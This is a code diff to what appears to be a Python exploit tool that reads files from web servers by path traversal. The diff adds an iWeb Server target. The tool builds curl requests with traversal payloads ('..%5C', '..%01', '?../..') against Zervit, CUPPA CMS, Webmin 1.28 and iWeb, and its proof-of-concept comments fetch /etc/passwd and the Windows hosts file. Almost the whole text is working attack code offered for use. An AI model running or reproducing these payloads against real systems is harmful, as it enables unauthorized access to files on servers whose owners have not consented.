@@ -50,7 +50,8 @@ def targets(name=None):
         
         [ zervit = Zervit 0.4 for Windows ]
         [ cuppa  = CUPPA CMS vb.0..1 for FreeBSD ]
-        [ wbm128 = Webmin 1.28 for Fedora Core 4 ] 
+        [ wbm128 = Webmin 1.28 for Fedora Core 4 ]
+        [ iweb = Ashley Brown iWeb Server for Windows ]
     ''','white')
 pars = argparse.ArgumentParser(description="", usage=banner())
 pars.add_argument('ip', nargs='+', help='Target IP Address')
@@ -102,15 +103,15 @@ oprs   = "Windows"
 ###############################################################################################################################
 try:
     ##########################
-	# Zervit 0.4 For Windows #
-	##########################
+    # Zervit 0.4 For Windows #
+    ##########################
     if trgt == "zervit":
         oprs = "Windows"
         trv     = "?../../../../../../../../../../../../../../.."
         sta     = "curl -s --insecure " + header + " " + prto + "://" + host + ":" + prt + "/" + rfile + trv
         #stb     = "'"
         getrqt  = sta + rpath + "/" + rfile #+ stb
-        # POC curl http://172.16.0.10:8008/hosts?../../../..../../../../../../windows/system32/drivers/etc/hosts
+        # POC curl http://172.16.0.10:8008/hosts?../../../../../../../../../../windows/system32/drivers/etc/hosts
         print(cl("[+] ", "green") + cl('Targeting : Zervit 0.4 on ' + oprs, "white"))
     #################################
     # CUPPA CMS vb.0..1 for FreeBSD #
@@ -140,6 +141,17 @@ try:
         getrqt  = sta + rpath + "/" + rfile
         # POC curl http://10.11.1.141:10000/unauthenticated//..%01/..%01/..%01/..%01/..%01/etc/passwd
         print(cl("[+] ", "green") + cl('Targeting : Webmin 1.28 on ' + oprs, "white"))
+    ########################################
+    # Ashley Brown iWeb Server For Windows #
+    ########################################
+    elif trgt == "iweb":
+        oprs = "Windows"
+        trv     = "..%5C..%5C..%5C..%5C..%5C..%5C"
+        sta     = "curl -s --insecure " + header + " " + prto + "://" + host + ":" + prt + "/" + rfile + trv
+        #stb     = "'"
+        getrqt  = sta + rpath + "/" + rfile #+ stb
+        # POC curl http://172.16.0.10/..%5C..%5C..%5C..%5C..%5C..%5C/windows/system32/drivers/etc/hosts
+        print(cl("[+] ", "green") + cl('Targeting : Ashley Brown iWeb Server on ' + oprs, "white"))
     ##################################################
     # Placeholder. Other Targets To Be Added Soon... #
     ##################################################
